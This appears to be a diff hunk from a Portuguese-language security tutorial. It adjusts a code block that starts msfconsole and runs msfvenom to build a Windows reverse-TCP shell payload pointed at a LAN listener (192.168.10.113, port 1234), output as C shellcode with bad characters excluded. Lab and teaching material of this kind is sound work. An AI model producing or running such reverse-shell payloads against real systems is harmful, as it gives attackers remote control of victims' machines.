@@ -22,7 +22,7 @@ no caso é feito em outro módulo/processo que está em execução no computador
 
 ```ruby
 msfconsole
-msfvenom -p windows/shell_reverse_tcp
+msf6 > msfvenom -p windows/shell_reverse_tcp
 LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 ```
 
